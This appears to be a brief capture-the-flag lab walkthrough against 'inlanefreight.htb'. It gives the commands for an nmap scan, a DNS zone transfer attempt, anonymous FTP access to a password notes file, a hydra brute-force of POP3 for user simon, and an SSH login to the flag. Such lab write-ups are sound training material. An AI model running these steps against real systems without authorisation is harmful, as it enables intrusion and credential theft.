Let's enumerate first
sudo nmap -p- <Target IP>
Open ports 22 (ssh), 53 (domain), 110 (pop3), 995(pop3s), 2121 (ccproxy-ftp), 30021 (unknown)
Let's do a more detailed scan
sudo nmap -sC -sV -p 22,53,110,995,2121,30021 -A -O <Target IP>
*Found out there is a FTP port open on 30021*
*DNS looks like an interesting approach*

Let's add our domain to etc/hosts file
sudo nano /etc/hosts
at line 3 add: <Target IP> inlanefreight.htb
ctrl X
y
<Enter>

Let's use the dig tool for DNS zone transfer
dig AXFR @inlanefreight.htb inlanefreight.htb
*not much to see here...*

Let's check FTP next, maybe we can log in anonymously
ftp <Target IP> 30021
Name: anonymous <Enter>
Pass: leave empty <Enter>
SUCCESS
ls -al
cd simon
ls
get mynotes.txt
exit
nano mynotes.txt
*There seem to be passwords for something, maybe we can use hydra instead of manually trying...*

Let's try brute forcing POP3 with the name simon and passwords in the mynotes.txt
hydra -l simon -P mynotes.txt -f <Target IP> pop3
Found matching username and password

Let's log into ssh with the username and password we just found
ssh simon@<Target IP>
yes
<Enter password>
SUCCESS
ls
found flag.txt
